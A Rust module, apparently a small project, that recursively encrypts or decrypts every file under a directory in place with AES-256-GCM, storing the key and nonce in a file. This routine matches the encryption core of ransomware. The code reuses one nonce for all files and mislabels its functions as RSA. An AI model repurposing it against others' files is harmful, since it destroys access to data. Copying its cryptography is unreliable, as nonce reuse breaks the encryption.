pub mod cyp {
    use std::io::{self, Read};
    use std::fs::{self, DirEntry, File};
    use std::path::Path;
    use aes_gcm::aead::{Aead, KeyInit, OsRng};
    use aes_gcm::{Nonce,Aes256Gcm, AeadCore};
    use aes_gcm::aead::generic_array::{typenum::{U12, U32} ,
                        GenericArray };
    pub struct Aescipher {
        nonce:Nonce<U12>,
        key: GenericArray<u8, U32>
    }
    impl Aescipher {
        pub fn new() -> Self {
            let key = Aes256Gcm::generate_key(OsRng);
            let nonce = Aes256Gcm::generate_nonce(OsRng);
            return Aescipher { nonce, key };
        }
        pub fn to_bytes(&self) -> Vec<u8> {
            let mut bytes = Vec::new();
            bytes.extend_from_slice(&self.nonce);
            bytes.extend_from_slice(self.key.as_slice());
            bytes
        }
        fn from_bytes(bytes: &[u8]) -> Self {
            let nonce = Nonce::from_slice(&bytes[..12]);
            let key = GenericArray::from_slice(&bytes[12..44]);
            Aescipher { nonce: *nonce, key: *key}
        }
        fn to_aes_cipher(&self) -> Aes256Gcm {
            Aes256Gcm::new(&self.key)
        }
    }
    
    pub fn save_cipher_to_file(cipher: &Aescipher, file_path: &str) 
    -> std::io::Result<()> {
        let bytes = cipher.to_bytes();
        fs::write(file_path, &bytes)?;
        Ok(())
    }

    pub fn load_cipher_from_file(file_path: &str) -> std::io::Result<Aescipher> {
        let mut file = File::open(file_path)?;
        let mut bytes = Vec::new();
        file.read_to_end(&mut bytes)?;
        let cipher = Aescipher::from_bytes(&bytes);
        Ok(cipher)
    }
   // @brief Iterates over the files in the directory and applies the fun
    pub fn aes_dirs(dir: &Path,
            fun: fn(file:&DirEntry, cip: &Aescipher) -> io::Result<()>,
            cip:&Aescipher) -> io::Result<()> {
        if dir.is_dir()  {
            for entry in fs::read_dir(dir)? {
                let entry = entry?;
                let path = entry.path();
                if path.is_dir() {
                    let _ = aes_dirs(&path, fun, cip);
                }
                else
                {
                    let _ = fun(&entry, cip);
                }
            }
        }
        Ok(())
    }
    // @brief performs a RSA decypher of the file
    pub fn aes_dec(file:&DirEntry, cyp: &Aescipher) -> io::Result<()> {
            let enc_data = fs::read(file.path())?;
            let cipher = cyp.to_aes_cipher();
            let dec_data = cipher.decrypt(&cyp.nonce, enc_data.as_ref())
            .expect("Decryption failure");
            fs::write(file.path(), dec_data)?;
            println!("decyphered {:?}", file.file_name());
            Ok(())
        }
    // @brief performs a RSA cypher of the file
    pub fn aes_enc(file:&DirEntry, cyp: &Aescipher) -> io::Result<()> {
            let data = fs::read(file.path())?;
            let cipher = cyp.to_aes_cipher();
            let enc_data = cipher.encrypt(&cyp.nonce, data.as_ref())
            .expect("Encryption failure");
            fs::write(file.path(), enc_data)?;
            println!("cyphered {:?}", file.file_name());
            Ok(())
        }
}
